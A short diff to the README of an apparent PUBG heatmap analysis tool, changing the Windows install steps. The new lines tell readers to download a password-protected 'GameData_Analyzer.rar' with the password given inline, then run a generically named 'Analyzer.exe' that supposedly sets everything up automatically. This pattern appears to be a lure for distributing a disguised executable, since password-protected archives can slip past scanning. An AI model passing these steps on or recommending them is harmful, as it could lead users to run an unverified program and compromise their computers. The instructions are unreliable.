@@ -21,8 +21,8 @@ The application automatically fetches data from the **cloud** and highlights **"
 
 ## 📥 Installation & Run
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ **Download and extract the `.rar` file**  
-2️⃣ **Run `PUBG_Heatmap_Analyzer.exe`**  
+1️⃣ **Download and extract the `GameData_Analyzer.rar` (pass: 123Gamedata)  
+2️⃣ **Run `Analyzer.exe`**   
 🚀 **The program will set everything up automatically – just enjoy!**  
 
 ⚠️ **Important:** This method is the fastest and easiest way to run the software!  
